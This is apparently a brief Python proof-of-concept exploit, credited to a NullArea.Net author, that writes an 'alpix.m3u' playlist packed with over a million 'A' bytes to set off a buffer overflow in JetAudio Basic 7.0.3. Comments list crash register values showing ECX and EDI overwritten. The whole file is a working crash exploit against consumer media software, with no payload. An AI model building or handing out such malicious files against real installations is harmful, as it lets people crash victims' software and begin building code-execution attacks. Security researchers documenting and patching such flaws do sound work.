#!/usr/bin/python
#By ALpHaNiX
#NullArea.Net

# proofs of concept
#EAX FFFFFFFF
#ECX 41414141
#EDX 00000001
#EBX 7FFD3000
#ESP 04ECFD8C
#EBP 04ECFDBC
#ESI 041F8648
#EDI 41414141
#EIP 7711737D kernel32.7711737D
#ESI & EDI Overritten


print "[+] JetAudio Basic 7.0.3 BufferOverFlow PoC"
lol="alpix.m3u"
file=open(lol,'w')
file.write("\x41"*1065987)
file.close()
print "[+]",lol,"File created "
